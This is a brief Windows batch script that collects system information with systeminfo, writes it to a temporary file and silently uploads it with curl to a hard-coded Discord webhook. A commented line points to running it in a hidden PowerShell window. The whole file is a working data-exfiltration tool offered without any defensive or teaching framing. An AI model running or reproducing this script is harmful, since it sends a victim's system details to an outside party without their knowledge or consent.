@echo off
::powershell.exe -windowstyle Hidden -command
title z%random%
cd %temp%

set webhook=https://discordapp.com/api/webhooks/1029420421134680064/O3e1_ivqQexrC5xDMF-5ne9hsrcZhyw561covq0STMU2hprO2ONNy5Ur03RSPSb5k_5h

:Commands
systeminfo > output.txt
curl --silent --output /dev/null -F save.dat=@"output.txt" %webhook%
pause
